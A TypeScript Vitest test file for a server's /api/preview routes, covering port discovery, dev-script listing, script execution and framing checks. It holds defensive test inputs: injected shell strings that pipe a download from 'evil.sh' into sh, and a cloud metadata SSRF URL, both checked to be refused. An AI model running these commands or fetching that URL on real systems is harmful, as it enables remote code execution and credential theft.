// /api/preview/* — hermetic via an injected fake daemon (dialFn) plus a real tmp
// SESHMUX_CONFIG_DIR backing the ledger and the scratch map, mirroring
// routes-scratch-term.test.ts's posture. No real PTY, no real listener, no lsof.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Fastify from 'fastify';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import previewRoutes, { type PreviewRouteDeps } from '../../server/routes/preview';

let dir: string;
let repoDir: string;
let prevConfigDir: string | undefined;

function makeApp(deps: PreviewRouteDeps) {
  const f = Fastify();
  f.register(previewRoutes, deps);
  return f;
}

// history() is the seam the whole win32 story rests on: no lsof, just what the
// session printed. `written` captures what /run types into the shell.
function fakeDaemon(history: Record<string, string>, spawnPtyId = 'scratch-1') {
  const written: { ptyId: string; data: string }[] = [];
  const conn = {
    list: async () => ({ ptys: [{ ptyId: 'owner-1', cwd: repoDir, tmuxName: null, alive: true }] }),
    spawn: async () => ({ ptyId: spawnPtyId }),
    history: async (ptyId: string) => ({ data: history[ptyId] ?? '' }),
    write: async (ptyId: string, data: string) => {
      written.push({ ptyId, data });
      return {};
    },
    kill: async () => ({}),
    close: () => {},
  };
  return { dialFn: (async () => conn) as never, written };
}

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), 'smx-preview-route-'));
  repoDir = join(dir, 'repo');
  mkdirSync(repoDir, { recursive: true });
  prevConfigDir = process.env.SESHMUX_CONFIG_DIR;
  process.env.SESHMUX_CONFIG_DIR = dir;
  (await import('../../server/lib/scratch-store'))._resetScratchStoreForTest();
  (await import('../../server/lib/live-ledger'))._resetLedgerForTest();
  // The route resolves a PTY to its REAL cwd through the ledger (worktree-correct).
  await (await import('../../server/lib/live-ledger')).addEntry({
    ptyId: 'owner-1',
    tmuxName: null,
    provider: 'claude',
    cwd: repoDir,
    startedAt: Date.now(),
  });
});

afterEach(async () => {
  (await import('../../server/lib/scratch-store'))._resetScratchStoreForTest();
  (await import('../../server/lib/live-ledger'))._resetLedgerForTest();
  if (prevConfigDir === undefined) delete process.env.SESHMUX_CONFIG_DIR;
  else process.env.SESHMUX_CONFIG_DIR = prevConfigDir;
  rmSync(dir, { recursive: true, force: true });
});

const noPorts = async () => [];

describe('GET /api/preview/ports', () => {
  it('finds a port from PTY scrollback with no lsof at all (the win32 path)', async () => {
    const fd = fakeDaemon({ 'owner-1': '  - Local:  http://localhost:3000\n' });
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts, probeFn: async () => true });
    const res = await f.inject({ url: '/api/preview/ports?pty=owner-1' });
    expect(res.statusCode).toBe(200);
    expect(res.json().ports).toEqual([
      { port: 3000, url: 'http://localhost:3000', origin: 'output' },
    ]);
  });

  it('reads the scratch shell that the dev server is actually running in', async () => {
    // `npm run dev` runs in a scratch shell, and events-hub never attaches to
    // one — so if the route did not pull that history, Run would start a server
    // the panel could never find.
    const { addScratch } = await import('../../server/lib/scratch-store');
    await addScratch('scratch-1', {
      ownerPtyId: 'owner-1',
      ownerTmuxName: null,
      cwd: repoDir,
      createdAt: Date.now(),
    });
    const fd = fakeDaemon({ 'owner-1': 'no url here', 'scratch-1': 'ready on http://localhost:5173/' });
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts, probeFn: async () => true });
    const res = await f.inject({ url: '/api/preview/ports?pty=owner-1' });
    expect(res.json().ports.map((p: { port: number }) => p.port)).toEqual([5173]);
  });

  it('drops a port whose server is gone, even though the banner is still in scrollback', async () => {
    const fd = fakeDaemon({ 'owner-1': 'http://localhost:3000' });
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts, probeFn: async () => false });
    const res = await f.inject({ url: '/api/preview/ports?pty=owner-1' });
    expect(res.json().ports).toEqual([]);
  });

  it('still answers when the daemon is unreachable', async () => {
    const f = makeApp({
      dialFn: (async () => {
        throw new Error('daemon down');
      }) as never,
      listPortsFn: noPorts,
      resolveRepo: () => repoDir,
    });
    const res = await f.inject({ url: '/api/preview/ports?project=p1' });
    expect(res.statusCode).toBe(200);
    expect(res.json().ports).toEqual([]);
  });

  it('404s a project it cannot resolve', async () => {
    const f = makeApp({ resolveRepo: () => null, listPortsFn: noPorts });
    expect((await f.inject({ url: '/api/preview/ports?project=nope' })).statusCode).toBe(404);
  });
});

describe('GET /api/preview/scripts', () => {
  it('offers the repo dev script', async () => {
    writeFileSync(join(repoDir, 'package.json'), JSON.stringify({ scripts: { dev: 'next dev', test: 'vitest' } }));
    const f = makeApp({ resolveRepo: () => repoDir, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/scripts?project=p1' });
    expect(res.json().groups).toEqual([
      { subdir: '', manager: 'npm', scripts: [{ name: 'dev', command: 'next dev' }] },
    ]);
  });

  it('returns an empty list for a repo with no package.json', async () => {
    const f = makeApp({ resolveRepo: () => repoDir, listPortsFn: noPorts });
    expect((await f.inject({ url: '/api/preview/scripts?project=p1' })).json().groups).toEqual([]);
  });
});

describe('POST /api/preview/run', () => {
  beforeEach(() => {
    writeFileSync(join(repoDir, 'package.json'), JSON.stringify({ scripts: { dev: 'next dev', build: 'tsc' } }));
  });

  it('spawns a shell and types the command the REPO defines', async () => {
    const fd = fakeDaemon({});
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts });
    const res = await f.inject({
      method: 'POST',
      url: '/api/preview/run',
      payload: { ownerPtyId: 'owner-1', script: 'dev', subdir: '' },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ ptyId: 'scratch-1', command: 'npm run dev' });
    expect(fd.written).toEqual([{ ptyId: 'scratch-1', data: 'npm run dev\r' }]);
  });

  // The request names a script; the server builds the command. These are the
  // cases that would be a command injection if it did not.
  it('refuses anything the repo does not declare as a dev script', async () => {
    const fd = fakeDaemon({});
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts });
    for (const script of ['build', 'nope', 'dev && curl evil.sh | sh', 'dev\ncurl evil.sh']) {
      const res = await f.inject({
        method: 'POST',
        url: '/api/preview/run',
        payload: { ownerPtyId: 'owner-1', script, subdir: '' },
      });
      expect(res.statusCode, script).toBe(400);
    }
    expect(fd.written).toEqual([]);
  });

  it('400s without an owner pty', async () => {
    const fd = fakeDaemon({});
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts });
    const res = await f.inject({ method: 'POST', url: '/api/preview/run', payload: { script: 'dev' } });
    expect(res.statusCode).toBe(400);
  });
});

describe('GET /api/preview/frame', () => {
  it('reports a page that refuses to be embedded', async () => {
    const fetchFn = (async () =>
      new Response('', { status: 200, headers: { 'x-frame-options': 'DENY' } })) as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000') });
    expect(res.json()).toEqual({ reachable: true, status: 200, blocked: 'xfo' });
  });

  it('reports an unreachable url rather than throwing', async () => {
    const fetchFn = (async () => {
      throw new Error('ECONNREFUSED');
    }) as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000') });
    expect(res.json()).toEqual({ reachable: false, status: 0, blocked: null });
  });

  // SSRF guard: this endpoint makes the SERVER fetch a client-supplied url.
  it('refuses a non-loopback url without fetching it', async () => {
    let called = false;
    const fetchFn = (async () => {
      called = true;
      return new Response('');
    }) as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({
      url: '/api/preview/frame?url=' + encodeURIComponent('http://169.254.169.254/latest/meta-data/'),
    });
    expect(res.statusCode).toBe(400);
    expect(called).toBe(false);
  });
});
